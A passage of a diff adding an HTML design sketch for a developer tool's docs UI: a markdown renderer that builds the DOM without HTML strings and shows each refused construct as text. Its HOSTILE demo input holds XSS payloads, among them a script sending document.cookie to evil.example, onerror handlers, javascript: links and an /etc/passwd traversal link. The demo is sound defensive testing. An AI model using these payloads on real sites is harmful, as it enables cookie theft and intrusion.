+      <tr><td>what this command is, what it takes</td><td>the command registration — <span class="m">name / usage / summary</span> in <span class="m">registry.ts</span>, which already prints the banner</td><td><span class="m">GET /api/help/command/:name</span> serializes the registration. No prose is written for the UI.</td></tr>
+      <tr><td>what a concept means</td><td><span class="m">src/help/topics/*.md</span> — the same files <span class="m">mycontext help</span> prints, and the same <span class="m">capture.md</span> that is already the MCP tool-description source</td><td><span class="m">GET /api/help/topic/:t</span> returns exactly what <span class="m">helpTopic()</span> returns, rendered by R1.</td></tr>
+      <tr><td>what a category / config key means</td><td>the resolved config + <span class="m">HE_CATEGORY_DESCRIPTIONS</span></td><td><span class="m">GET /api/config</span>, which exists.</td></tr>
+      <tr><td>why <em>this</em> is the way it is, in <em>this</em> repo, right now</td><td><span class="m">select()</span>, <span class="m">doctor</span>, <span class="m">FocusReport</span> — computed, never written</td><td>the existing endpoints. This is the part a docs site can never have.</td></tr>
+    </tbody>
+  </table>
+  <p class="note"><strong>The rule that keeps it one spelling:</strong> the UI writes no explanatory
+  prose about a command, a flag, a category or a config key. Every such sentence is fetched.
+  The UI's own words are limited to the shell's chrome, the <em>question</em> a control answers, and
+  the landing predicate. Greppable: there is no <span class="m">help.cmd.*</span> namespace in either
+  string table, and the source scan fails if one appears.</p>
+</div>
+
+<p class="note noprint" style="margin-block-start:var(--sp-6)">
+  Fabricated demo data throughout. The markdown source is deliberately hostile.
+  Contrast readouts are computed at runtime; everything else illustrative is tagged
+  <span class="tag-ill">illustrative</span>.
+</p>
+
+<script>
+'use strict';
+/* ═══════════════════════════════════════════════════════════════════════════
+   THE MARKDOWN RENDERER (R1)
+   Three phases, and no phase ever holds an HTML string:
+     1. blocks()  lines → block tokens         (pure, testable with no DOM)
+     2. inline()  a line → inline tokens        (pure, testable with no DOM)
+     3. build()   tokens → DOM                  (createElement + textContent)
+   Every element is created from a frozen tag table. Every leaf is textContent.
+   Every class name is a literal from this file. Nothing from the document ever
+   reaches a tag name, a class, an id, a style or an href.
+   ═══════════════════════════════════════════════════════════════════════════ */
+
+/** The complete set of elements this renderer may create. Nothing else. */
+const TAGS = Object.freeze({
+  h: ['h2','h3','h4','h5','h6'],   // '#' → h2. A quoted doc may not make an h1.
+  p:'p', pre:'pre', code:'code', ul:'ul', ol:'ol', li:'li', quote:'blockquote',
+  hr:'hr', table:'table', thead:'thead', tbody:'tbody', tr:'tr', th:'th', td:'td',
+  det:'details', sum:'summary', strong:'strong', em:'em', del:'del', a:'a',
+  bdi:'bdi', span:'span', div:'div',
+});
+
+const SAFE_PATH = /^[A-Za-z0-9._\/-]+$/;
+const HTML_BLOCK_OPEN = /^\s{0,3}<([A-Za-z][A-Za-z0-9-]*)/;
+
+/**
+ * Text whose direction is UNKNOWN — anything read off disk or out of the
+ * corpus — goes in a <bdi>. Text whose direction is KNOWN LTR (ids, paths,
+ * flags, code) goes in .m/<code>, which carries direction:ltr;
+ * unicode-bidi:isolate. Every text node in a rendered document goes through
+ * one of these two. 06-a11y.md's contract, applied to markdown output.
+ */
+function txt(s){ const b = document.createElement(TAGS.bdi); b.textContent = s; return b; }
+function el(tag, cls){ const n = document.createElement(tag); if (cls) n.className = cls; return n; }
+
+/* ── phase 1: blocks ────────────────────────────────────────────────────── */
+function blocks(src){
+  const lines = src.replace(/\r\n/g,'\n').split('\n');
+  const out = [];
+  const refusals = [];
+  let i = 0;
+
+  const isBlank = (l) => l.trim() === '';
+
+  while (i < lines.length){
+    const line = lines[i];
+
+    if (isBlank(line)) { i++; continue; }
+
+    // front matter, only at the very top
+    if (i === 0 && /^---\s*$/.test(line)){
+      const body = [];
+      let j = i + 1;
+      while (j < lines.length && !/^---\s*$/.test(lines[j])) body.push(lines[j++]);
+      if (j < lines.length){ out.push({t:'front', lines:body, line:i+1}); i = j + 1; continue; }
+    }
+
+    // generated-example marker: <!-- example: list constraint --full -->
+    let m = /^<!--\s*(example|example-md):\s*(.+?)\s*-->$/.exec(line.trim());
+    if (m){ out.push({t:'genmark', cmd:m[2], line:i+1}); i++; continue; }
+    if (/^<!--\s*\/example\s*-->$/.test(line.trim())){ i++; continue; }
+    if (/^<!--/.test(line.trim()) && /-->$/.test(line.trim())){ i++; continue; }  // plain comment
+
+    // fenced code
+    m = /^\s{0,3}(`{3,}|~{3,})\s*([A-Za-z0-9_+-]*)\s*$/.exec(line);
+    if (m){
+      const fence = m[1], lang = m[2], body = [];
+      let j = i + 1;
+      while (j < lines.length && !(new RegExp('^\\s{0,3}' + fence[0] + '{' + fence.length + ',}\\s*$')).test(lines[j])) body.push(lines[j++]);
+      out.push({t:'code', lang, lines:body, line:i+1});
+      i = j + 1; continue;
+    }
+
+    // <details> / <summary> — the two recognised block markers
+    if (/^\s*<details>\s*$/.test(line)){ out.push({t:'det-open', line:i+1}); i++; continue; }
+    if (/^\s*<\/details>\s*$/.test(line)){ out.push({t:'det-close', line:i+1}); i++; continue; }
+    m = /^\s*<summary>(.*)<\/summary>\s*$/.exec(line);
+    if (m){ out.push({t:'summary', text:m[1], line:i+1}); i++; continue; }
+
+    // any other raw HTML block — REFUSED, kept as text, counted
+    m = HTML_BLOCK_OPEN.exec(line);
+    if (m){
+      const tag = m[1].toLowerCase();
+      const body = [line];
+      let j = i + 1;
+      const closer = new RegExp('</' + tag + '>', 'i');
+      if (!closer.test(line)){
+        while (j < lines.length && !closer.test(lines[j])) body.push(lines[j++]);
+        if (j < lines.length) body.push(lines[j++]);
+      } else { j = i + 1; }
+      const r = {kind:'raw HTML block <' + tag + '>', line:i+1};
+      refusals.push(r);
+      out.push({t:'refused', lines:body, why:r.kind, line:i+1});
+      i = j; continue;
+    }
+
+    // ATX heading
+    m = /^\s{0,3}(#{1,6})\s+(.*?)\s*#*\s*$/.exec(line);
+    if (m){ out.push({t:'h', depth:m[1].length, text:m[2], line:i+1}); i++; continue; }
+
+    // thematic break
+    if (/^\s{0,3}([-*_])\s*(\1\s*){2,}$/.test(line)){ out.push({t:'hr', line:i+1}); i++; continue; }
+
+    // block quote
+    if (/^\s{0,3}>/.test(line)){
+      const body = [];
+      let j = i;
+      while (j < lines.length && (/^\s{0,3}>/.test(lines[j]) || (!isBlank(lines[j]) && body.length))){
+        body.push(lines[j].replace(/^\s{0,3}>\s?/, ''));
+        j++;
+      }
+      out.push({t:'quote', lines:body, line:i+1});
+      i = j; continue;
+    }
+
+    // table — a header row followed by a delimiter row
+    if (line.includes('|') && i + 1 < lines.length && /^\s*\|?[\s:|-]+\|[\s:|-]*$/.test(lines[i+1]) && lines[i+1].includes('-')){
+      const rows = [];
+      let j = i;
+      const head = splitRow(lines[j++]); j++;              // header, then delimiter
+      while (j < lines.length && lines[j].includes('|') && !isBlank(lines[j])) rows.push(splitRow(lines[j++]));
+      out.push({t:'table', head, rows, line:i+1});
+      i = j; continue;
+    }
+
+    // list
+    m = /^(\s*)([-*+]|\d{1,9}[.)])\s+(.*)$/.exec(line);
+    if (m){
+      const ordered = !/^[-*+]$/.test(m[2]);
+      const items = [];
+      let j = i;
+      while (j < lines.length){
+        const lm = /^(\s*)([-*+]|\d{1,9}[.)])\s+(.*)$/.exec(lines[j]);
+        if (!lm) {
+          // a continuation line indented under the current item
+          if (!isBlank(lines[j]) && /^\s{2,}/.test(lines[j]) && items.length){
+            items[items.length-1].text += ' ' + lines[j].trim(); j++; continue;
+          }
+          break;
+        }
+        if ((!/^[-*+]$/.test(lm[2])) !== ordered && lm[1].length === 0) break;
+        items.push({indent:Math.min(3, Math.floor(lm[1].length / 2)), text:lm[3]});
+        j++;
+      }
+      out.push({t:'list', ordered, items, line:i+1});
+      i = j; continue;
+    }
+
+    // indented code
+    if (/^ {4,}\S/.test(line)){
+      const body = [];
+      let j = i;
+      while (j < lines.length && (/^ {4,}/.test(lines[j]) || isBlank(lines[j]))) body.push(lines[j++].slice(4));
+      while (body.length && body[body.length-1].trim()==='') body.pop();
+      out.push({t:'code', lang:'', lines:body, line:i+1});
+      i = j; continue;
+    }
+
+    // paragraph — the fallthrough. Nothing is ever dropped.
+    {
+      const body = [];
+      let j = i;
+      while (j < lines.length && !isBlank(lines[j])
+             && !/^\s{0,3}(#{1,6})\s/.test(lines[j])
+             && !/^\s{0,3}(`{3,}|~{3,})/.test(lines[j])
+             && !/^\s{0,3}>/.test(lines[j])
+             && !HTML_BLOCK_OPEN.test(lines[j])
+             && !/^(\s*)([-*+]|\d{1,9}[.)])\s+/.test(lines[j])) body.push(lines[j++]);
+      if (body.length === 0) { body.push(lines[i]); j = i + 1; }
+      out.push({t:'p', text:body.join(' ').trim(), line:i+1});
+      i = j;
+    }
+  }
+  return {tokens:out, refusals};
+}
+
+function splitRow(line){
+  return line.replace(/^\s*\|/,'').replace(/\|\s*$/,'').split('|').map((c)=>c.trim());
+}
+
+/* ── phase 2: inline ────────────────────────────────────────────────────── */
+/**
+ * Code spans are taken FIRST and are opaque to every later pass, which is the
+ * one ordering rule that keeps `**` inside a code span from becoming <strong>.
+ */
+function inline(text, refusals, line){
+  const parts = [];
+  let rest = text;
+
+  // 1. code spans
+  const codeRe = /(`+)([\s\S]*?)\1/g;
+  let last = 0, m;
+  const segs = [];
+  while ((m = codeRe.exec(rest)) !== null){
+    if (m.index > last) segs.push({code:false, s:rest.slice(last, m.index)});
+    segs.push({code:true, s:m[2].trim()});
+    last = m.index + m[0].length;
+  }
+  if (last < rest.length) segs.push({code:false, s:rest.slice(last)});
+
+  for (const seg of segs){
+    if (seg.code){ parts.push({t:'code', s:seg.s}); continue; }
+    parts.push(...inlineNonCode(seg.s, refusals, line));
+  }
+  return parts;
+}
+
+function inlineNonCode(s, refusals, line){
+  const out = [];
+  let i = 0, buf = '';
+  const flush = () => { if (buf) { out.push({t:'text', s:buf}); buf = ''; } };
+
+  while (i < s.length){
+    const rest = s.slice(i);
+
+    // inline raw HTML — refused, kept as text, counted
+    let m = /^<\/?[A-Za-z][A-Za-z0-9-]*(\s[^<>]*)?\/?>/.exec(rest);
+    if (m){
+      flush();
+      refusals.push({kind:'inline HTML ' + m[0].slice(0, 40), line});
+      out.push({t:'refused', s:m[0]});
+      i += m[0].length; continue;
+    }
+
+    // image — refused by policy
+    m = /^!\[([^\]]*)\]\(([^)\s]*)[^)]*\)/.exec(rest);
+    if (m){
+      flush();
+      refusals.push({kind:'image (not rendered): ' + (m[2] || '(no src)'), line});
+      out.push({t:'refused', s:'[image: ' + (m[1] || 'no alt text') + '] ' + m[2]});
+      i += m[0].length; continue;
+    }
+
+    // link
+    m = /^\[([^\]]+)\]\(([^)\s]+)(?:\s+"[^"]*")?\)/.exec(rest);
+    if (m){
+      flush();
+      out.push(classifyLink(m[1], m[2], refusals, line));
+      i += m[0].length; continue;
+    }
+
+    // autolink
+    m = /^<((?:https?):\/\/[^>\s]+)>/.exec(rest);
+    if (m){ flush(); out.push({t:'ext', s:m[1], label:m[1]}); i += m[0].length; continue; }
+
+    // strong / em / del
+    m = /^(\*\*|__)([\s\S]+?)\1/.exec(rest);
+    if (m){ flush(); out.push({t:'strong', kids:inlineNonCode(m[2], refusals, line)}); i += m[0].length; continue; }
+    m = /^(~~)([\s\S]+?)~~/.exec(rest);
+    if (m){ flush(); out.push({t:'del', kids:inlineNonCode(m[2], refusals, line)}); i += m[0].length; continue; }
+    m = /^(\*|_)([^*_\s][\s\S]*?)\1/.exec(rest);
+    if (m){ flush(); out.push({t:'em', kids:inlineNonCode(m[2], refusals, line)}); i += m[0].length; continue; }
+
+    buf += s[i]; i++;
+  }
+  flush();
+  return out;
+}
+
+/**
+ * The link policy. Three shapes survive; everything else is literal text.
+ * No corpus value ever reaches href: the internal case is built by the router
+ * from a validated path, never assigned from the document.
+ */
+function classifyLink(label, target, refusals, line){
+  if (/^#[A-Za-z0-9_-]+$/.test(target)) return {t:'anchor', s:label, target};
+  if (/^https?:\/\//i.test(target))     return {t:'ext', s:label, label:target};
+  if (SAFE_PATH.test(target) && !target.split('/').includes('..')) return {t:'route', s:label, target};
+  refusals.push({kind:'link target refused: ' + target.slice(0, 60), line});
+  return {t:'refused', s:'[' + label + '](' + target + ')'};
+}
+
+/* ── phase 3: build ─────────────────────────────────────────────────────── */
+function buildInline(parent, parts){
+  for (const p of parts){
+    if (p.t === 'text'){ parent.append(txt(p.s)); continue; }
+    if (p.t === 'code'){ const c = el(TAGS.code); c.textContent = p.s; parent.append(c); continue; }
+    if (p.t === 'strong' || p.t === 'em' || p.t === 'del'){
+      const n = el(TAGS[p.t]); buildInline(n, p.kids); parent.append(n); continue;
+    }
+    if (p.t === 'refused'){ const n = el(TAGS.span, 'refused-in'); n.textContent = p.s; parent.append(n); continue; }
+    if (p.t === 'ext'){
+      // NOT an anchor. Text, plus the URL made visible so the reader judges it.
+      parent.append(txt(p.s));
+      const u = el(TAGS.span, 'ext'); u.textContent = ' ⟨' + p.label + '⟩'; parent.append(u);
+      continue;
+    }
+    if (p.t === 'anchor' || p.t === 'route'){
+      const a = el(TAGS.a, 'route');
+      // href is built here, from a validated token — never assigned from data.
+      a.href = p.t === 'anchor' ? '#' : hrefFor(p.target);
+      a.append(txt(p.s));
+      if (p.t === 'route'){ const u = el(TAGS.span,'ext'); u.textContent = ' ⟨' + p.target + '⟩'; a.append(u); }
+      parent.append(a);
+      continue;
+    }
+  }
+}
+
+/** The router's only entry point from document data. Refuses anything it did
+ *  not build itself. In the product this is `ctx.hrefFor`. */
+function hrefFor(repoPath){
+  if (!SAFE_PATH.test(repoPath) || repoPath.split('/').includes('..')) return '#';
+  return '/docs?file=' + encodeURIComponent(repoPath);
+}
+
+function build(tokens, refusals){
+  const frag = document.createDocumentFragment();
+  let detailsStack = [];
+  const target = () => detailsStack.length ? detailsStack[detailsStack.length-1] : frag;
+
+  for (const tk of tokens){
+    switch (tk.t){
+      case 'h': {
+        const n = el(TAGS.h[Math.min(TAGS.h.length - 1, tk.depth - 1)]);
+        buildInline(n, inline(tk.text, refusals, tk.line));
+        target().append(n); break;
+      }
+      case 'p': {
+        const n = el(TAGS.p);
+        buildInline(n, inline(tk.text, refusals, tk.line));
+        target().append(n); break;
+      }
+      case 'code': {
+        const pre = el(TAGS.pre), c = el(TAGS.code, 'm');
+        c.textContent = tk.lines.join('\n');
+        if (tk.lang) pre.dataset.lang = tk.lang;   // dataset, never a class from the doc
+        pre.append(c); target().append(pre); break;
+      }
+      case 'hr': target().append(el(TAGS.hr)); break;
+      case 'quote': {
+        const q = el(TAGS.quote);
+        const inner = blocks(tk.lines.join('\n'));
+        refusals.push(...inner.refusals);
+        q.append(build(inner.tokens, refusals));
+        target().append(q); break;
+      }
+      case 'list': {
+        const root = el(tk.ordered ? TAGS.ol : TAGS.ul);
+        let cur = root, depth = 0;
+        const stack = [root];
+        for (const it of tk.items){
+          const d = Math.min(3, it.indent);
+          while (d > depth){ const sub = el(tk.ordered ? TAGS.ol : TAGS.ul);
+            (stack[stack.length-1].lastElementChild || stack[stack.length-1]).append(sub);
+            stack.push(sub); depth++; }
+          while (d < depth){ stack.pop(); depth--; }
+          cur = stack[stack.length-1];
+          const li = el(TAGS.li);
+          const task = /^\[([ xX])\]\s+(.*)$/.exec(it.text);
+          if (task){ li.append(txt(task[1] === ' ' ? '☐ ' : '☑ ')); buildInline(li, inline(task[2], refusals, tk.line)); }
+          else buildInline(li, inline(it.text, refusals, tk.line));
+          cur.append(li);
+        }
+        target().append(root); break;
+      }
+      case 'table': {
+        const t = el(TAGS.table), thead = el(TAGS.thead), tbody = el(TAGS.tbody), hr = el(TAGS.tr);
+        for (const h of tk.head){ const th = el(TAGS.th); th.setAttribute('scope','col');
+          buildInline(th, inline(h, refusals, tk.line)); hr.append(th); }
+        thead.append(hr);
+        for (const row of tk.rows){
+          const tr = el(TAGS.tr);
+          for (const cell of row){ const td = el(TAGS.td); buildInline(td, inline(cell, refusals, tk.line)); tr.append(td); }
+          tbody.append(tr);
+        }
+        t.append(thead, tbody); target().append(t); break;
+      }
+      case 'det-open': { const d = el(TAGS.det); target().append(d); detailsStack.push(d); break; }
+      case 'det-close': detailsStack.pop(); break;
+      case 'summary': {
+        const s = el(TAGS.sum);
+        buildInline(s, inline(tk.text, refusals, tk.line));
+        (detailsStack.length ? detailsStack[detailsStack.length-1] : frag).prepend(s); break;
+      }
+      case 'front': {
+        const d = el(TAGS.det); const s = el(TAGS.sum);
+        s.textContent = 'front matter (' + tk.lines.length + ' lines) — not rendered as content';
+        const pre = el(TAGS.pre), c = el(TAGS.code, 'm');
+        c.textContent = tk.lines.join('\n'); pre.append(c);
+        d.append(s, pre); target().append(d); break;
+      }
+      case 'genmark': {
+        // The README's own generated-example marker, turned into the product's
+        // strongest honesty signal for free.
+        const d = el(TAGS.div, 'cmd flat');
+        const e = el(TAGS.p, 'eyebrow');
+        e.textContent = 'generated — real output of the command below, regenerated by npm run gen:docs';
+        const c = el(TAGS.code, 'm'); c.textContent = 'mycontext ' + tk.cmd;
+        d.append(e, c); target().append(d); break;
+      }
+      case 'refused': {
+        const n = el(TAGS.div, 'refused');
+        const tag = el(TAGS.span, 'refused-tag');
+        tag.textContent = 'not rendered — ' + tk.why + ' (line ' + tk.line + '), shown as text';
+        n.append(tag, document.createTextNode(tk.lines.join('\n')));
+        target().append(n); break;
+      }
+    }
+  }
+  return frag;
+}
+
+/** The public entry point. Returns DOM plus the ledger — never a string. */
+function renderMarkdown(src){
+  const {tokens, refusals} = blocks(src);
+  const node = build(tokens, refusals);
+  return {node, refusals};
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   THE DEMO DOCUMENTS
+   ═══════════════════════════════════════════════════════════════════════════ */
+const FRIENDLY = [
+  '# Postgres pool capped at 20',
+  '',
+  'RDS permits 25 connections; 5 are reserved for migrations and the admin console.',
+  'This is a `constraint`, so it is **normative** and an agent\'s capture lands as a draft.',
+  '',
+  '## Scope',
+  '',
+  '- `src/db/**`',
+  '- `src/api/handlers/**` — added after the [pool incident](docs/audit/2026-03-pool.md)',
+  '- see also <https://www.postgresql.org/docs/current/runtime-config-connection.html>',
+  '',
+  '> The pool size must never exceed 20 across all workers.',
+  '> A divergence means a leak, and it must fail loudly.',
+  '',
+  '| field | value | checked by |',
+  '|---|---|---|',
+  '| `severity` | hard | `select()` |',
+  '| `always` | false | the pinned-tier test |',
+  '',
+  '```ts',
+  'const pool = new Pool({ max: 20 });   // never raise this without an ADR',
+  '```',
+  '',
+  '<!-- example: list constraint --full -->',
+  '',
+  '---',
+  '',
+  '1. Read the ADR it derives from',
+  '2. Check the scope still matches',
+  '   1. `doctor` reports `dead_scope` when it does not',
+  '3. ~~Raise the cap~~ never do this',
+  '',
+  '<details>',
+  '<summary>The incident this came from</summary>',
+  '',
+  'Connections exhausted at 14:02. Migrations could not run for 40 minutes.',
+  '',
+  '</details>',
+].join('\n');
+
+const HOSTILE = [
+  '---',
+  'title: an item body that has been ingested from a document',
+  'origin: ingest',
+  '---',
+  '',
+  '# A body that tries several things',
+  '',
+  'Ordinary prose first, so the refusals below are visibly the exception.',
+  '',
+  '<script>fetch("http://evil.example/"+document.cookie)</script>',
+  '',
+  'An inline attempt: <img src=x onerror="alert(1)"> and a <b>bold</b> tag.',
+  '',
+  '![a pixel](data:image/gif;base64,R0lGODlhAQABAAAAACw=)',
+  '',
+  'A [click here](javascript:alert(document.domain)) link, and a',
+  '[data link](data:text/html,<script>alert(1)</script>) beside it.',
+  '',
+  'A traversal: [config](../../../../etc/passwd) and a good one: [the readme](README.md).',
+  '',
+  '<style>:root{--panel:red}.gloss{display:none}</style>',
+  '',
+  '<iframe src="http://evil.example"></iframe>',
+  '',
+  '`` `**not bold inside a code span**` `` and a real **bold** after it.',
+  '',
+  '| id | note |',
+  '|---|---|',
+  '| `RULE-<img src=x onerror=alert(1)>` | an id-grammar payload in a table cell |',
+  '',
+  'And an unknown construct the scanner has no rule for: [^1] footnote marker,',
+  '$$ x^2 + y^2 $$ math, and a term',
+  ': definition — all of which fall through to paragraph text rather than to nothing.',
+].join('\n');
+
+const HEBREW = [
+  '# מדיניות היקף — `src/api/**`',
+  '',
+  'הפריט הזה חל על כל קובץ תחת `src/api/**`, והוא **נורמטיבי**.',
+  'מזהה הפריט הוא `CONST-postgres-pool-capped-at-20`, והוא נבדק על ידי `select()`.',
+  '',
+  '- דרג: `hard`',
+  '- מספר קבצים תואמים: 38',
+  '- הקובץ שממנו נלקח: `docs/audit/2026-03-pool.md`',
+  '',
+  '> אסור שמספר החיבורים יעלה על 20 בכל העובדים יחד.',
+  '',
+  '```json',
+  '{ "scopePolicy": "inert", "budgets": { "pinned": 6000 } }',
+  '```',
+].join('\n');
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   WIRING
+   ═══════════════════════════════════════════════════════════════════════════ */
+const $ = (id) => document.getElementById(id);
+let showingSource = false;
+let current = 'friendly';
+
+const DOCS = {
+  friendly: {src:FRIENDLY, path:'.my_context/items/constraint/CONST-postgres-pool-capped-at-20.md',
+             meta:'2.1 KB · modified 4 days ago', origin:'origin: human'},
+  hostile:  {src:HOSTILE,  path:'.my_context/items/reference/REF-ingested-runbook.md',
+             meta:'1.4 KB · modified 11 minutes ago', origin:'origin: ingest'},
+  hebrew:   {src:HEBREW,   path:'docs/README.he.md#scope',
+             meta:'0.6 KB · modified today', origin:'origin: human'},
+};
+
+function paint(){
+  const d = DOCS[current];
+  $('src').textContent = d.src;
+  $('dh-path').textContent = d.path;
+  $('dh-meta').textContent = d.meta;
+  $('dh-origin').textContent = d.origin;
+
+  const out = $('out');
+  out.replaceChildren();                       // never innerHTML = ''
+  out.setAttribute('dir', current === 'hebrew' ? 'rtl' : 'ltr');
+  out.setAttribute('lang', current === 'hebrew' ? 'he' : 'en');
+
+  if (showingSource){
+    const pre = document.createElement('pre');
+    pre.className = 'srcpane';
+    pre.textContent = d.src;
+    out.append(pre);
+  } else {
+    const {node, refusals} = renderMarkdown(d.src);
+    out.append(node);
+    paintLedger(refusals);
+    return;
+  }
+  paintLedger(renderMarkdown(d.src).refusals);
+}
+
+function paintLedger(refusals){
+  const box = $('ledger');
+  box.replaceChildren();
+  box.classList.toggle('clean', refusals.length === 0);
+  const p = document.createElement('p');
+  p.style.margin = '0';
+  p.className = 'eyebrow';
+  p.textContent = refusals.length === 0
+    ? 'nothing on this page was refused — every construct in it is rendered'
+    : refusals.length + ' thing(s) on this page are shown as text rather than rendered';
+  box.append(p);
+  if (refusals.length){
+    const ul = document.createElement('ul');
+    const seen = new Map();
+    for (const r of refusals){
+      const key = r.kind;
+      if (!seen.has(key)) seen.set(key, []);
+      seen.get(key).push(r.line);
+    }
+    for (const [kind, lines] of seen){
+      const li = document.createElement('li');
+      const b = document.createElement('bdi');
+      b.textContent = kind;
+      li.append(b, document.createTextNode(' — line' + (lines.length>1?'s':'') + ' ' + lines.join(', ')));
+      ul.append(li);
+    }
+    box.append(ul);
+    const n = document.createElement('p');
+    n.className = 'note';
+    n.style.marginBottom = '0';
+    n.textContent = 'Each is kept, marked and counted. Nothing is dropped silently — and the whole '
+      + 'source is one button away, so the refusal costs the reader information about form, never content.';
+    box.append(n);
+  }
+}
+
+$('toggle-src').addEventListener('click', (e) => {
+  showingSource = !showingSource;
+  e.currentTarget.setAttribute('aria-pressed', String(showingSource));
+  e.currentTarget.textContent = showingSource ? 'show rendered' : 'show source for the whole document';
+  paint();
+});
+$('sw-hostile').addEventListener('click', (e) => {
+  const on = current !== 'hostile';
+  current = on ? 'hostile' : 'friendly';
+  $('sw-he').checked = false;
+  e.currentTarget.setAttribute('aria-pressed', String(on));
+  e.currentTarget.textContent = on ? 'load the ordinary document' : 'load the hostile document';
+  paint();
+});
+$('sw-he').addEventListener('change', (e) => {
+  current = e.currentTarget.checked ? 'hebrew' : 'friendly';
+  $('sw-hostile').setAttribute('aria-pressed','false');
+  $('sw-hostile').textContent = 'load the hostile document';
+  paint();
+});
+
+for (const [id, cls] of [['sw-rt','sim-rt'],['sw-fc','sim-fc'],['sw-print','sim-print']]){
+  $(id).addEventListener('change', (e) => document.body.classList.toggle(cls, e.currentTarget.checked));
+}
+
+/* ── R4: the help regions, built from "fetched" payloads ─────────────────── */
+/* In the product each `parts` object is assembled from four sources and the UI
+   contributes no sentence of its own. Here they are inlined so the sketch runs
+   with no server; each part is labelled with the source it would come from. */
+const HELP = {
+  'x-scope': {
+    what: {src:'src/help/topics/scope.md — the same text `mycontext help scope` prints',
+      md:'A **scope** is a list of glob patterns. An item with a scope is weighed only against '
+        + 'file operations whose path matches one of them. An item with **no** scope is weighed '
+        + 'against `every` file operation, forever — unless its category sets `scopePolicy: "inert"`, '
+        + 'in which case it is never injected at all.'},
+    here: {src:'computed — matchesScope() over your real tree, and doctor',
+      md:'In **this** project: `src/api/**` matches **38** files. 14 items carry a scope; **2** of '
+        + 'them match no file at all and `doctor` reports them as `dead_scope`. '
+        + 'There is no `src/payments/` in this repository — the nearest existing prefixes are '
+        + '`src/api/` (38) and `src/billing/` (12).'},
+    cmd: 'mycontext edit CONST-postgres-pool-capped-at-20 --scope "src/api/**" --yes',
+    landing: 'The item file gains the new scope line and the audit log gains a record with '
+      + '`op: edit`, `origin: human`, `fields: ["scope"]`. This card flips to landed and prints that '
+      + 'record\'s timestamp. Until then it reads not seen yet — never not run.',
+    more: [['docs viewer — README §6, “Scope globs — the per-item switch”','/docs?doc=readme&at=h52'],
+           ['tutorial — “When it did not fire”, rung 4','/tutorial?doc=not-fired&at=h6']],
+  },
+  'x-yes': {
+    what: {src:'the command registration — registry.ts, the same line the banner prints',
+      md:'`--yes` is the confirmation token every mutating command requires. It is not a security '
+        + 'boundary: a shell has every power the tool has. It is a **legibility** boundary — an '
+        + 'explicit, greppable token in your transcript that says a write was intended.'},
+    here: {src:'computed — the audit log for this project',
+      md:'**7** commands in your last 20 sessions carried `--yes`; all 7 are recorded with '
+        + '`origin: human`. **0** writes have ever reached this corpus from this page, and none can: '
+        + 'the server imports no mutator, and a test over the import graph asserts it.'},
+    cmd: 'mycontext review promote DRAFT-retry-budget --scope "src/api/**" --yes',
+    landing: 'A `promote` record appears in the audit log with `origin: human`. If the corpus moves '
+      + 'but not that way, this card says diverged and names what changed instead.',
+    more: [['docs viewer — README §7, “The approval boundary”','/docs?doc=readme&at=h61'],
+           ['tutorial — “Walking the queue”, step 3','/tutorial?doc=queue&at=h4']],
+  },
+};
+
+function buildHelp(region, payload){
+  region.replaceChildren();
+  const sec = (title, srcline, node) => {
+    const s = document.createElement('section');
+    const h = document.createElement('h4'); h.textContent = title;
+    s.append(h, node);
+    if (srcline){ const c = document.createElement('p'); c.className = 'src'; c.textContent = srcline; s.append(c); }
+    return s;
+  };
+  const md = (text) => { const {node} = renderMarkdown(text); const d = document.createElement('div'); d.append(node); return d; };
+
+  region.append(sec('what it is', payload.what.src, md(payload.what.md)));
+  region.append(sec('in this project', payload.here.src, md(payload.here.md)));
+
+  const cmdBox = document.createElement('div');
+  cmdBox.className = 'cmd flat';
+  cmdBox.style.marginBottom = '0';
+  const code = document.createElement('code');
+  const idx = payload.cmd.indexOf('--yes');
+  if (idx >= 0){
+    code.append(document.createTextNode(payload.cmd.slice(0, idx)));
+    const y = document.createElement('span'); y.className = 'yes'; y.textContent = '--yes';
+    code.append(y, document.createTextNode(payload.cmd.slice(idx + 5)));
+  } else code.textContent = payload.cmd;
+  cmdBox.append(code);
+  region.append(sec('run this in your terminal — this page never writes', null, cmdBox));
+
+  const land = document.createElement('p'); land.textContent = payload.landing;
+  region.append(sec('how you will know it worked', 'the command definition\'s landing predicate', land));
+
+  const ul = document.createElement('ul');
+  ul.style.margin = '0'; ul.style.paddingInlineStart = '20px';
+  for (const [label, href] of payload.more){
+    const li = document.createElement('li');
+    const a = document.createElement('a'); a.href = href; a.append(txt(label));
+    const u = document.createElement('span'); u.className = 'ext'; u.textContent = ' ⟨' + href + '⟩';
+    li.append(a, u); ul.append(li);
+  }
+  region.append(sec('read more — deep-linked to the exact section', null, ul));
+}
+
+for (const btnId of ['x-scope-btn','x-yes-btn']){
+  const btn = $(btnId);
+  const region = $(btn.getAttribute('aria-controls'));
+  btn.addEventListener('click', () => {
+    const open = btn.getAttribute('aria-expanded') === 'true';
+    btn.setAttribute('aria-expanded', String(!open));
+    region.hidden = open;
+    if (!open && !region.firstChild) buildHelp(region, HELP[region.id]);
+  });
+}
+
+/* ── R5: measure the gloss, in this browser, from the resolved tokens ────── */
+function srgbToLin(c){ c /= 255; return c <= 0.03928 ? c/12.92 : Math.pow((c+0.055)/1.055, 2.4); }
+function lum(rgb){ return 0.2126*srgbToLin(rgb[0]) + 0.7152*srgbToLin(rgb[1]) + 0.0722*srgbToLin(rgb[2]); }
+function ratio(a, b){ const la = lum(a), lb = lum(b); const hi = Math.max(la,lb), lo = Math.min(la,lb);
+  return (hi + 0.05) / (lo + 0.05); }
+function parseRGB(s){
+  const m = /rgba?\(\s*([\d.]+)[,\s]+([\d.]+)[,\s]+([\d.]+)(?:[,/\s]+([\d.]+))?/.exec(s);
+  return m ? [+m[1], +m[2], +m[3], m[4] === undefined ? 1 : +m[4]] : [0,0,0,1];
+}
+function over(fg, bg){ const a = fg[3];
+  return [fg[0]*a + bg[0]*(1-a), fg[1]*a + bg[1]*(1-a), fg[2]*a + bg[2]*(1-a), 1]; }
+
+function measure(scopeEl, tableEl){
+  const probe = document.createElement('div');
+  scopeEl.append(probe);
+  const read = (v) => { probe.style.color = 'var(' + v + ')';
+    return parseRGB(getComputedStyle(probe).color); };
+  const panel = read('--panel');
+  const ink   = read('--ink');
+  const dim   = read('--dim');
+  const faint = read('--faint');
+  const top   = read('--sheen-top');
+  const bot   = read('--sheen-bottom');
+  probe.remove();
+
+  const sheenTop = over(top, panel);      // worst case at the top of the card
+  const sheenBot = over(bot, panel);      // worst case at the bottom
